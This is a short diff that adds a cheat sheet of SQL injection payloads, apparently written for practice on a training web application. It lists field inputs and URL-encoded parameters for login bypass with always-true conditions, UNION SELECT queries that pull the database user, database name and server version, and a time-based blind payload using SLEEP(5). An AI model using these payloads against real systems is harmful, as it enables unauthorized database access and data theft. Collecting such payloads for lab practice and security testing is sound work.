@@ -1,0 +1,22 @@
+Field input
+' OR '1'='1
+1' OR '1'='1'#
+1' OR 1=1#
+1' OR '1'='1' ORDER BY 2#
+1' UNION SELECT user(),database()--
+1' UNION SELECT user(),database()#
+1' UNION SELECT user(),table(),database()#
+
+URL Parameters
+?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#
+?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment%23&Submit=Submit#
+?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#
+
+
+Blind:
+
+Field input
+1' AND SLEEP(5)#
+
+URL Parameters
+?id=1%27+AND+SLEEP%285%29%23&Submit=Submit#
